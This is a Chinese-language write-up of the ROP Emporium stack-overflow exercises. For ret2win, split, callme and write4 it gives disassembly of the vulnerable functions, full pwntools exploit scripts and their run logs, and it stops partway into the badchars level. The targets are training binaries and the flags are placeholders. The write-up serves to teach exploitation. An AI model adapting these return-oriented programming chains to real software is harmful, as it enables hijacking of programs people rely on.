> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-282823.htm)

> [原创] 栈溢出练习：ROP Emporium

![](https://bbs.kanxue.com/upload/attach/202408/988863_92PV65RRNVZ6U3U.webp)

> **个人博客原文链接：[https://www.kn0sky.com/?p=938527f1-03c4-4349-8110-5510f7d4b84a](https://www.kn0sky.com/?p=938527f1-03c4-4349-8110-5510f7d4b84a)**

前言
--

我第一次做这套练习是在初学 pwn 的时候，隐约记得当时做了一半放弃是卡在了 fluff 上，当时很复杂，没耐心搞懂 bextr 和 xlat 指令就放弃了，现在回过头来，补全当初

这套练习非常适合新手用于栈溢出的学习练习和查缺补漏，关于栈溢出的 8 个情况，从最基础的覆盖返回地址，到 rop，到利用一些机制完成受限的 rop，例如栈迁移扩大可控空间，csu 操纵寄存器等

本文分享中，非常简单的地方就写的比较简单，不浪费篇幅，复杂的地方分析的内容会比较多

1. ret2win
----------

缓解机制：【NX】

漏洞函数：

```
.text:00000000004006E8 pwnme           proc near               ; CODE XREF: main+3B↑p
.text:00000000004006E8
.text:00000000004006E8 s               = byte ptr -20h
.text:00000000004006E8
.text:00000000004006E8 ; __unwind {
.text:00000000004006E8                 push    rbp
.text:00000000004006E9                 mov     rbp, rsp
.text:00000000004006EC                 sub     rsp, 20h
.text:00000000004006F0                 lea     rax, [rbp+s]
.text:00000000004006F4                 mov     edx, 20h ; ' '  ; n
.text:00000000004006F9                 mov     esi, 0          ; c
.text:00000000004006FE                 mov     rdi, rax        ; s
.text:0000000000400701                 call    _memset
.text:0000000000400706                 mov     edi, offset aForMyFirstTric ; "For my first trick, I will attempt to f"...
.text:000000000040070B                 call    _puts
.text:0000000000400710                 mov     edi, offset aWhatCouldPossi ; "What could possibly go wrong?"
.text:0000000000400715                 call    _puts
.text:000000000040071A                 mov     edi, offset aYouThereMayIHa ; "You there, may I have your input please"...
.text:000000000040071F                 call    _puts
.text:0000000000400724                 mov     edi, offset format ; "> "
.text:0000000000400729                 mov     eax, 0
.text:000000000040072E                 call    _printf

.text:0000000000400733                 lea     rax, [rbp+s]
.text:0000000000400737                 mov     edx, 38h ; '8'  ; nbytes
.text:000000000040073C                 mov     rsi, rax        ; buf
.text:000000000040073F                 mov     edi, 0          ; fd
.text:0000000000400744                 call    _read

.text:0000000000400749                 mov     edi, offset aThankYou ; "Thank you!"
.text:000000000040074E                 call    _puts
.text:0000000000400753                 nop
.text:0000000000400754                 leave
.text:0000000000400755                 retn
.text:0000000000400755 ; } // starts at 4006E8
.text:0000000000400755 pwnme           endp
```

read 读取 0x38 字节到变量 rbp-0x20 中，存在溢出

程序存在后门函数：

```
.text:0000000000400756 ret2win         proc near
.text:0000000000400756 ; __unwind {
.text:0000000000400756                 push    rbp
.text:0000000000400757                 mov     rbp, rsp
.text:000000000040075A                 mov     edi, offset aWellDoneHereSY ; "Well done! Here's your flag:"
.text:000000000040075F                 call    _puts
.text:0000000000400764                 mov     edi, offset command ; "/bin/cat flag.txt"
.text:0000000000400769                 call    _system
.text:000000000040076E                 nop
.text:000000000040076F                 pop     rbp
.text:0000000000400770                 retn
.text:0000000000400770 ; } // starts at 400756
.text:0000000000400770 ret2win         endp
```

exp：

```
#!/bin/python3
from pwn import *
warnings.filterwarnings(action='ignore',category=BytesWarning)
#context.log_level = 'debug'
FILE_NAME = "./ret2win"
REMOTE_HOST = ""
REMOTE_PORT = 0
 
elf = context.binary = ELF(FILE_NAME)
#libc = elf.libc
 
gs = '''
continue
'''
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST,REMOTE_PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
 
# =======================================
io = start()
 
# =============================================================================
# ============== exploit ===================
 
win = 0x40075A
payload = cyclic(0x28) + pack(win)
io.sendline(payload)
 
# =============================================================================
 
io.interactive()
```

运行结果：

```
ret2win ➤ ./exp_cli.py
[*] '/home/selph/ctf/rop_emporium_all_challenges/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/selph/ctf/rop_emporium_all_challenges/ret2win/ret2win': pid 3847
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64
 
For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!
 
> Thank you!
Well done! Here's your flag:
[*] Process '/home/selph/ctf/rop_emporium_all_challenges/ret2win/ret2win' stopped with exit code 0 (pid 3847)
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

2. split
--------

缓解机制：【NX】

程序：

```
.text:00000000004006E8 pwnme           proc near               ; CODE XREF: main+3B↑p
.text:00000000004006E8
.text:00000000004006E8 s               = byte ptr -20h
.text:00000000004006E8
.text:00000000004006E8 ; __unwind {
.text:00000000004006E8                 push    rbp
.text:00000000004006E9                 mov     rbp, rsp
.text:00000000004006EC                 sub     rsp, 20h
.text:00000000004006F0                 lea     rax, [rbp+s]
.text:00000000004006F4                 mov     edx, 20h ; ' '  ; n
.text:00000000004006F9                 mov     esi, 0          ; c
.text:00000000004006FE                 mov     rdi, rax        ; s
.text:0000000000400701                 call    _memset
.text:0000000000400706                 mov     edi, offset aContrivingARea ; "Contriving a reason to ask user for dat"...
.text:000000000040070B                 call    _puts
.text:0000000000400710                 mov     edi, offset format ; "> "
.text:0000000000400715                 mov     eax, 0
.text:000000000040071A                 call    _printf

.text:000000000040071F                 lea     rax, [rbp+s]
.text:0000000000400723                 mov     edx, 60h ; '`'  ; nbytes
.text:0000000000400728                 mov     rsi, rax        ; buf
.text:000000000040072B                 mov     edi, 0          ; fd
.text:0000000000400730                 call    _read

.text:0000000000400735                 mov     edi, offset aThankYou ; "Thank you!"
.text:000000000040073A                 call    _puts
.text:000000000040073F                 nop
.text:0000000000400740                 leave
.text:0000000000400741                 retn
.text:0000000000400741 ; } // starts at 4006E8
.text:0000000000400741 pwnme           endp
```

read 调用存在溢出

程序提供了一些辅助代码：

```
.text:0000000000400742 usefulFunction  proc near
.text:0000000000400742 ; __unwind {
.text:0000000000400742                 push    rbp
.text:0000000000400743                 mov     rbp, rsp
.text:0000000000400746                 mov     edi, offset command ; "/bin/ls"
.text:000000000040074B                 call    _system
.text:0000000000400750                 nop
.text:0000000000400751                 pop     rbp
.text:0000000000400752                 retn
.text:0000000000400752 ; } // starts at 400742
```

```
.data:0000000000601060                 public usefulString
.data:0000000000601060 usefulString    db '/bin/cat flag.txt',0
.data:0000000000601060 _data           ends
.data:0000000000601060
```

目标是读取 flag.txt，这里需要 rop 修改一下 rdi 直接跳转到 syscall 的 call 上即可

‍

exp：

```
#!/bin/python3
from pwn import *
warnings.filterwarnings(action='ignore',category=BytesWarning)
context.log_level = 'debug'
FILE_NAME = "./split"
REMOTE_HOST = ""
REMOTE_PORT = 0


elf = context.binary = ELF(FILE_NAME)
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST,REMOTE_PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()

# =============================================================================
# ============== exploit ===================

# 0x00000000004007c3 : pop rdi ; ret
pop_rdi = 0x00000000004007c3
win = 0x40074B
flag = 0x601060
payload = cyclic(0x28) + pack(pop_rdi) + pack(flag) + pack(win)
io.sendline(payload)

# =============================================================================

io.interactive()
```

运行结果：

```
split ➤ ./exp_cli.py
[*] '/home/selph/ctf/rop_emporium_all_challenges/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    SHSTK:    Enabled
    IBT:      Enabled
[+] Starting local process '/home/selph/ctf/rop_emporium_all_challenges/split/split' argv=[b'/home/selph/ctf/rop_emporium_all_challenges/split/split'] : pid 7405
[DEBUG] Sent 0x41 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  c3 07 40 00  00 00 00 00  │iaaa│jaaa│··@·│····│
    00000030  60 10 60 00  00 00 00 00  4b 07 40 00  00 00 00 00  │`·`·│····│K·@·│····│
    00000040  0a                                                  │·│
[*] Switching to interactive mode
[DEBUG] Received 0x57 bytes:
    b'split by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Contriving a reason to ask user for data...\n'
    b'> Thank you!\n'
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
[DEBUG] Received 0x6b bytes:
    b'ROPE{a_placeholder_32byte_flag!}\n'
    b'split by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Contriving a reason to ask user for data...\n'
ROPE{a_placeholder_32byte_flag!}
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
[*] Process '/home/selph/ctf/rop_emporium_all_challenges/split/split' stopped with exit code -11 (SIGSEGV) (pid 7405)
[*] Got EOF while reading in interactive
```

3. callme
---------

缓解机制：【NX】

程序：

```
.text:0000000000400898 pwnme           proc near               ; CODE XREF: main+3B↑p
.text:0000000000400898
.text:0000000000400898 s               = byte ptr -20h
.text:0000000000400898
.text:0000000000400898 ; __unwind {
.text:0000000000400898                 push    rbp
.text:0000000000400899                 mov     rbp, rsp
.text:000000000040089C                 sub     rsp, 20h
.text:00000000004008A0                 lea     rax, [rbp+s]
.text:00000000004008A4                 mov     edx, 20h ; ' '  ; n
.text:00000000004008A9                 mov     esi, 0          ; c
.text:00000000004008AE                 mov     rdi, rax        ; s
.text:00000000004008B1                 call    _memset
.text:00000000004008B6                 mov     edi, offset aHopeYouReadThe ; "Hope you read the instructions...\n"
.text:00000000004008BB                 call    _puts
.text:00000000004008C0                 mov     edi, offset format ; "> "
.text:00000000004008C5                 mov     eax, 0
.text:00000000004008CA                 call    _printf

.text:00000000004008CF                 lea     rax, [rbp+s]
.text:00000000004008D3                 mov     edx, 200h       ; nbytes
.text:00000000004008D8                 mov     rsi, rax        ; buf
.text:00000000004008DB                 mov     edi, 0          ; fd
.text:00000000004008E0                 call    _read

.text:00000000004008E5                 mov     edi, offset aThankYou ; "Thank you!"
.text:00000000004008EA                 call    _puts
.text:00000000004008EF                 nop
.text:00000000004008F0                 leave
.text:00000000004008F1                 retn
.text:00000000004008F1 ; } // starts at 400898
.text:00000000004008F1 pwnme           endp
```

read 调用存在溢出

程序提供了一些辅助代码：

```
.text:00000000004008F2 usefulFunction  proc near
.text:00000000004008F2 ; __unwind {
.text:00000000004008F2                 push    rbp
.text:00000000004008F3                 mov     rbp, rsp
.text:00000000004008F6                 mov     edx, 6
.text:00000000004008FB                 mov     esi, 5
.text:0000000000400900                 mov     edi, 4
.text:0000000000400905                 call    _callme_three
.text:000000000040090A                 mov     edx, 6
.text:000000000040090F                 mov     esi, 5
.text:0000000000400914                 mov     edi, 4
.text:0000000000400919                 call    _callme_two
.text:000000000040091E                 mov     edx, 6
.text:0000000000400923                 mov     esi, 5
.text:0000000000400928                 mov     edi, 4
.text:000000000040092D                 call    _callme_one
.text:0000000000400932                 mov     edi, 1          ; status
.text:0000000000400937                 call    _exit
.text:0000000000400937 ; } // starts at 4008F2
.text:0000000000400937 usefulFunction  endp
.text:0000000000400937
.text:000000000040093C ; ---------------------------------------------------------------------------
.text:000000000040093C
.text:000000000040093C usefulGadgets:
.text:000000000040093C                 pop     rdi
.text:000000000040093D                 pop     rsi
.text:000000000040093E                 pop     rdx
.text:000000000040093F                 retn
```

目标是解密 flag，看这个意思是让我连续调用三个函数，并用正确的顺序和参数调用

exp：

```
#!/bin/python3
from pwn import *
warnings.filterwarnings(action='ignore',category=BytesWarning)
context.log_level = 'debug'
FILE_NAME = "callme"
REMOTE_HOST = ""
REMOTE_PORT = 0


elf = context.binary = ELF(FILE_NAME)
libc = elf.libc

gs = '''
b*0x00000000004008f1
continue
'''
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST,REMOTE_PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()


# =============================================================================
# ============== exploit ===================

"""
.plt:0000000000400720 _callme_one     proc near               ; CODE XREF: usefulFunction+3B↓p
.plt:0000000000400720                 jmp     cs:off_601040
.plt:0000000000400720 _callme_one     endp

.plt:0000000000400740 _callme_two     proc near               ; CODE XREF: usefulFunction+27↓p
.plt:0000000000400740                 jmp     cs:off_601050
.plt:0000000000400740 _callme_two     endp

.plt:00000000004006F0 _callme_three   proc near               ; CODE XREF: usefulFunction+13↓p
.plt:00000000004006F0                 jmp     cs:off_601028
.plt:00000000004006F0 _callme_three   endp

.text:000000000040093C                 pop     rdi
.text:000000000040093D                 pop     rsi
.text:000000000040093E                 pop     rdx
.text:000000000040093F                 retn
"""

pop_rdi_rsi_rdx = pack(0x00000000040093C)
callme1         = pack(0x000000000400720)               
callme2         = pack(0x000000000400740)               
callme3         = pack(0x0000000004006F0)               

payload = cyclic(0x28)
payload += pop_rdi_rsi_rdx + pack(0xDEADBEEFDEADBEEF) + pack(0xCAFEBABECAFEBABE) + pack(0xD00DF00DD00DF00D) + callme1
payload += pop_rdi_rsi_rdx + pack(0xDEADBEEFDEADBEEF) + pack(0xCAFEBABECAFEBABE) + pack(0xD00DF00DD00DF00D) + callme2
payload += pop_rdi_rsi_rdx + pack(0xDEADBEEFDEADBEEF) + pack(0xCAFEBABECAFEBABE) + pack(0xD00DF00DD00DF00D) + callme3

io.sendline(payload)

# =============================================================================

io.interactive()
```

运行结果：

```
callme ➤ ./exp_cli.py
[*] '/home/selph/ctf/rop_emporium_all_challenges/callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
[*] '/home/selph/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/selph/ctf/rop_emporium_all_challenges/callme/callme' argv=[b'/home/selph/ctf/rop_emporium_all_challenges/callme/callme'] : pid 23451
[DEBUG] Sent 0xa1 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  3c 09 40 00  00 00 00 00  │iaaa│jaaa│<·@·│····│
    00000030  ef be ad de  ef be ad de  be ba fe ca  be ba fe ca  │····│····│····│····│
    00000040  0d f0 0d d0  0d f0 0d d0  20 07 40 00  00 00 00 00  │····│····│ ·@·│····│
    00000050  3c 09 40 00  00 00 00 00  ef be ad de  ef be ad de  │<·@·│····│····│····│
    00000060  be ba fe ca  be ba fe ca  0d f0 0d d0  0d f0 0d d0  │····│····│····│····│
    00000070  40 07 40 00  00 00 00 00  3c 09 40 00  00 00 00 00  │@·@·│····│<·@·│····│
    00000080  ef be ad de  ef be ad de  be ba fe ca  be ba fe ca  │····│····│····│····│
    00000090  0d f0 0d d0  0d f0 0d d0  f0 06 40 00  00 00 00 00  │····│····│··@·│····│
    000000a0  0a                                                  │·│
    000000a1
[*] Switching to interactive mode
[DEBUG] Received 0xac bytes:
    b'callme by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Hope you read the instructions...\n'
    b'\n'
    b'> Thank you!\n'
    b'callme_one() called correctly\n'
    b'callme_two() called correctly\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Process '/home/selph/ctf/rop_emporium_all_challenges/callme/callme' stopped with exit code 0 (pid 23451)
[*] Got EOF while reading in interactive
```

4. write4
---------

缓解机制：【NX】

程序：漏洞函数位于 so 库中

```
.text:00000000000008AA
.text:00000000000008AA                 public pwnme
.text:00000000000008AA pwnme           proc near               ; DATA XREF: LOAD:00000000000003E0↑o
.text:00000000000008AA
.text:00000000000008AA s               = byte ptr -20h
.text:00000000000008AA
.text:00000000000008AA ; __unwind {
.text:00000000000008AA                 push    rbp
.text:00000000000008AB                 mov     rbp, rsp
.text:00000000000008AE                 sub     rsp, 20h
.text:00000000000008B2                 mov     rax, cs:stdout_ptr
.text:00000000000008B9                 mov     rax, [rax]
.text:00000000000008BC                 mov     ecx, 0          ; n
.text:00000000000008C1                 mov     edx, 2          ; modes
.text:00000000000008C6                 mov     esi, 0          ; buf
.text:00000000000008CB                 mov     rdi, rax        ; stream
.text:00000000000008CE                 call    _setvbuf
.text:00000000000008D3                 lea     rdi, s          ; "write4 by ROP Emporium"
.text:00000000000008DA                 call    _puts
.text:00000000000008DF                 lea     rdi, aX8664     ; "x86_64\n"
.text:00000000000008E6                 call    _puts
.text:00000000000008EB                 lea     rax, [rbp+s]
.text:00000000000008EF                 mov     edx, 20h ; ' '  ; n
.text:00000000000008F4                 mov     esi, 0          ; c
.text:00000000000008F9                 mov     rdi, rax        ; s
.text:00000000000008FC                 call    _memset
.text:0000000000000901                 lea     rdi, aGoAheadAndGive ; "Go ahead and give me the input already!"...
.text:0000000000000908                 call    _puts
.text:000000000000090D                 lea     rdi, format     ; "> "
.text:0000000000000914                 mov     eax, 0
.text:0000000000000919                 call    _printf

.text:000000000000091E                 lea     rax, [rbp+s]
.text:0000000000000922                 mov     edx, 200h       ; nbytes
.text:0000000000000927                 mov     rsi, rax        ; buf
.text:000000000000092A                 mov     edi, 0          ; fd
.text:000000000000092F                 call    _read

.text:0000000000000934                 lea     rdi, aThankYou  ; "Thank you!"
.text:000000000000093B                 call    _puts
.text:0000000000000940                 nop
.text:0000000000000941                 leave
.text:0000000000000942                 retn
.text:0000000000000942 ; } // starts at 8AA
.text:0000000000000942 pwnme           endp
```

read 调用存在溢出

程序提供了一些辅助代码：

```
.text:0000000000400617 usefulFunction  proc near
.text:0000000000400617 ; __unwind {
.text:0000000000400617                 push    rbp
.text:0000000000400618                 mov     rbp, rsp
.text:000000000040061B                 mov     edi, offset aNonexistent ; "nonexistent"
.text:0000000000400620                 call    _print_file
.text:0000000000400625                 nop
.text:0000000000400626                 pop     rbp
.text:0000000000400627                 retn
.text:0000000000400627 ; } // starts at 400617
.text:0000000000400627 usefulFunction  endp
.text:0000000000400627
.text:0000000000400628
.text:0000000000400628 ; =============== S U B R O U T I N E =======================================
.text:0000000000400628
.text:0000000000400628
.text:0000000000400628 usefulGadgets   proc near
.text:0000000000400628                 mov     [r14], r15
.text:000000000040062B                 retn
.text:000000000040062B usefulGadgets   endp
```

这里的 print_file：

```
.text:0000000000000943                 public print_file
.text:0000000000000943 print_file      proc near               ; DATA XREF: LOAD:00000000000003B0↑o
.text:0000000000000943
.text:0000000000000943 filename        = qword ptr -38h
.text:0000000000000943 s               = byte ptr -30h
.text:0000000000000943 stream          = qword ptr -8
.text:0000000000000943
.text:0000000000000943 ; __unwind {
.text:0000000000000943                 push    rbp
.text:0000000000000944                 mov     rbp, rsp
.text:0000000000000947                 sub     rsp, 40h
.text:000000000000094B                 mov     [rbp+filename], rdi
.text:000000000000094F                 mov     [rbp+stream], 0
.text:0000000000000957                 mov     rax, [rbp+filename]
.text:000000000000095B                 lea     rsi, modes      ; "r"
.text:0000000000000962                 mov     rdi, rax        ; filename
.text:0000000000000965                 call    _fopen
.text:000000000000096A                 mov     [rbp+stream], rax
.text:000000000000096E                 cmp     [rbp+stream], 0
.text:0000000000000973                 jnz     short loc_997
.text:0000000000000975                 mov     rax, [rbp+filename]
.text:0000000000000979                 mov     rsi, rax
.text:000000000000097C                 lea     rdi, aFailedToOpenFi ; "Failed to open file: %s\n"
.text:0000000000000983                 mov     eax, 0
.text:0000000000000988                 call    _printf
.text:000000000000098D                 mov     edi, 1          ; status
.text:0000000000000992                 call    _exit
.text:0000000000000997 ; ---------------------------------------------------------------------------
.text:0000000000000997
.text:0000000000000997 loc_997:                                ; CODE XREF: print_file+30↑j
.text:0000000000000997                 mov     rdx, [rbp+stream] ; stream
.text:000000000000099B                 lea     rax, [rbp+s]
.text:000000000000099F                 mov     esi, 21h ; '!'  ; n
.text:00000000000009A4                 mov     rdi, rax        ; s
.text:00000000000009A7                 call    _fgets
.text:00000000000009AC                 lea     rax, [rbp+s]
.text:00000000000009B0                 mov     rdi, rax        ; s
.text:00000000000009B3                 call    _puts
.text:00000000000009B8                 mov     rax, [rbp+stream]
.text:00000000000009BC                 mov     rdi, rax        ; stream
.text:00000000000009BF                 call    _fclose
.text:00000000000009C4                 mov     [rbp+stream], 0
.text:00000000000009CC                 nop
.text:00000000000009CD                 leave
.text:00000000000009CE                 retn
.text:00000000000009CE ; } // starts at 943
```

目标是读取 flag.txt，这里需要 rop 修改一下 rdi 指向 flag.txt 文件名，直接跳转到 print_file 的 call 上即可

‍

exp：

```
#!/bin/python3
from pwn import *
warnings.filterwarnings(action='ignore',category=BytesWarning)
context.log_level = 'debug'
FILE_NAME = "write4"
REMOTE_HOST = ""
REMOTE_PORT = 0


elf = context.binary = ELF(FILE_NAME)
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST,REMOTE_PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# =======================================

io = start()

# =============================================================================
# ============== exploit ===================
bss = 0x000000000601038
# 0x0000000000400690 : pop r14 ; pop r15 ; ret
# 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
print_file = 0x000000000400620

rop = ROP(elf)
rop.raw(0x0000000000400690)
rop.raw(bss)
rop.raw(b'flag.txt')
rop.raw(0x0000000000400628)
rop.rdi = bss
rop.raw(print_file)
print(rop.dump())

payload = cyclic(0x28) + rop.chain()
io.sendline(payload)
# =============================================================================

io.interactive()
```

运行结果：

```
write4 ➤ ./exp_cli.py
[*] '/home/selph/ctf/rop_emporium_all_challenges/write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    SHSTK:    Enabled
    IBT:      Enabled
[+] Starting local process '/home/selph/ctf/rop_emporium_all_challenges/write4/write4' argv=[b'/home/selph/ctf/rop_emporium_all_challenges/write4/write4'] : pid 28217
[*] Loaded 13 cached gadgets for 'write4'
0x0000:         0x400690 pop r14; pop r15; ret
0x0008:         0x601038 _edata
0x0010:      b'flag.txt' b'flag.txt'
0x0018:         0x400628 usefulGadgets
0x0020:         0x400693 pop rdi; ret
0x0028:         0x601038 _edata
0x0030:         0x400620
[DEBUG] Sent 0x61 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  90 06 40 00  00 00 00 00  │iaaa│jaaa│··@·│····│
    00000030  38 10 60 00  00 00 00 00  66 6c 61 67  2e 74 78 74  │8·`·│····│flag│.txt│
    00000040  28 06 40 00  00 00 00 00  93 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000050  38 10 60 00  00 00 00 00  20 06 40 00  00 00 00 00  │8·`·│····│ ·@·│····│
    00000060  0a                                                  │·│
[*] Switching to interactive mode
[DEBUG] Received 0x76 bytes:
    b'write4 by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Go ahead and give me the input already!\n'
    b'\n'
    b'> Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Process '/home/selph/ctf/rop_emporium_all_challenges/write4/write4' stopped with exit code -11 (SIGSEGV) (pid 28217)
[*] Got EOF while reading in interactive
```

5. badchars
-----------

缓解机制：【NX】

程序：

```
.text:00000000000008FA ; int pwnme()
.text:00000000000008FA                 public pwnme
.text:00000000000008FA pwnme           proc near               ; DATA XREF: LOAD:00000000000003E8↑o
.text:00000000000008FA
.text:00000000000008FA var_40          = qword ptr -40h
.text:00000000000008FA var_38          = qword ptr -38h
.text:00000000000008FA var_30          = qword ptr -30h
.text:00000000000008FA var_20          = byte ptr -20h
.text:00000000000008FA
.text:00000000000008FA ; __unwind {
.text:00000000000008FA                 push    rbp
.text:00000000000008FB                 mov     rbp, rsp
.text:00000000000008FE                 sub     rsp, 40h
.text:0000000000000902                 mov     rax, cs:stdout_ptr
.text:0000000000000909                 mov     rax, [rax]
.text:000000000000090C                 mov     ecx, 0          ; n
.text:0000000000000911                 mov     edx, 2          ; modes
.text:0000000000000916                 mov     esi, 0          ; buf
.text:000000000000091B                 mov     rdi, rax        ; stream
.text:000000000000091E                 call    _setvbuf
.text:0000000000000923                 lea     rdi, s          ; "badchars by ROP Emporium"
.text:000000000000092A                 call    _puts
.text:000000000000092F                 lea     rdi, aX8664     ; "x86_64\n"
.text:0000000000000936                 call    _puts
.text:000000000000093B                 lea     rax, [rbp+var_40]
.text:000000000000093F                 add     rax, 20h ; ' '
.text:0000000000000943                 mov     edx, 20h ; ' '  ; n
.text:0000000000000948                 mov     esi, 0          ; c
.text:000000000000094D                 mov     rdi, rax        ; s
.text:0000000000000950                 call    _memset
.text:0000000000000955                 lea     rdi, aBadcharsAreXGA ; "badchars are: 'x', 'g', 'a', '.'"
.text:000000000000095C                 call    _puts
.text:0000000000000961                 lea     rdi, format     ; "> "
.text:0000000000000968                 mov     eax, 0
.text:000000000000096D                 call    _printf

.text:0000000000000972                 lea     rax, [rbp+var_40]
.text:0000000000000976                 add     rax, 20h ; ' '
.text:000000000000097A                 mov     edx, 200h       ; nbytes
.text:000000000000097F                 mov     rsi, rax        ; buf
.text:0000000000000982                 mov     edi, 0          ; fd
.text:0000000000000987                 call    _read


.text:000000000000098C                 mov     [rbp+var_40], rax
.text:0000000000000990                 mov     [rbp+var_38], 0
.text:0000000000000998                 jmp     short loc_9EB
.text:000000000000099A ; ---------------------------------------------------------------------------
.text:000000000000099A
.text:000000000000099A loc_99A:                                ; CODE XREF: pwnme+FC↓j
.text:000000000000099A                 mov     [rbp+var_30], 0
.text:00000000000009A2                 jmp     short loc_9D5
.text:00000000000009A4 ; ---------------------------------------------------------------------------
.text:00000000000009A4
.text:00000000000009A4 loc_9A4:                                ; CODE XREF: pwnme+E3↓j
.text:00000000000009A4                 mov     rax, [rbp+var_38]
.text:00000000000009A8                 movzx   ecx, [rbp+rax+var_20]
.text:00000000000009AD                 mov     rax, [rbp+var_30]
.text:00000000000009B1                 mov     rdx, cs:badcharacters_ptr
.text:00000000000009B8                 movzx   eax, byte ptr [rdx+rax]
.text:00000000000009BC                 cmp     cl, al
.text:00000000000009BE                 jnz     short loc_9C9
.text:00000000000009C0                 mov     rax, [rbp+var_38]
.text:00000000000009C4                 mov     [rbp+rax+var_20], 0EBh
.text:00000000000009C9
.text:00000000000009C9 loc_9C9:                                ; CODE XREF: pwnme+C4↑j
.text:00000000000009C9                 mov     rax, [rbp+var_30]
.text:00000000000009CD                 add     rax, 1
.text:00000000000009D1                 mov     [rbp+var_30], rax
.text:00000000000009D5
.text:00000000000009D5 loc_9D5:                                ; CODE XREF: pwnme+A8↑j
.text:00000000000009D5                 mov     rax, [rbp+var_30]
.text:00000000000009D9                 cmp     rax, 3
.text:00000000000009DD                 jbe     short loc_9A4
.text:00000000000009DF                 mov     rax, [rbp+var_38]
.text:00000000000009E3                 add     rax, 1
.text:00000000000009E7                 mov     [rbp+var_38], rax
.text:00000000000009EB
.text:00000000000009EB loc_9EB:                                ; CODE XREF: pwnme+9E↑j
.text:00000000000009EB                 mov     rdx, [rbp+var_38]
.text:00000000000009EF                 mov     rax, [rbp+var_40]
.text:00000000000009F3                 cmp     rdx, rax
.text:00000000000009F6                 jb      short loc_99A
.text:00000000000009F8                 lea     rdi, aThankYou  ; "Thank you!"
.text:00000000000009FF                 call    _puts
.text:0000000000000A04                 nop
.text:0000000000000A05                 leave
.text:0000000000000A06                 retn
.text:0000000000000A06 ; } // starts at 8FA
.text:0000000000000A06 pwnme           endp
```

read 调用存在溢出，过滤了 4 个字符：`'x', 'g', 'a', '.'`​，漏洞程序在 so 库里

程序提供了一些辅助代码：

```
.text:0000000000400617 ; Attributes: bp-based frame
.text:0000000000400617
.text:0000000000400617 usefulFunction  proc near
.text:0000000000400617 ; __unwind {
.text:0000000000400617                 push    rbp
.text:0000000000400618                 mov     rbp, rsp
.text:000000000040061B                 mov     edi, offset aNonexistent ; "nonexistent"
.text:0000000000400620                 call    _print_file
.text:0000000000400625                 nop
.text:0000000000400626                 pop     rbp
.text:0000000000400627                 retn
.text:0000000000400627 ; } // starts at 400617
.text:0000000000400627 usefulFunction  endp
.text:0000000000400627
.text:0000000000400628 ; ---------------------------------------------------------------------------
.text:0000000000400628
.text:0000000000400628 usefulGadgets:
.text:0000000000400628                 xor     [r15], r14b
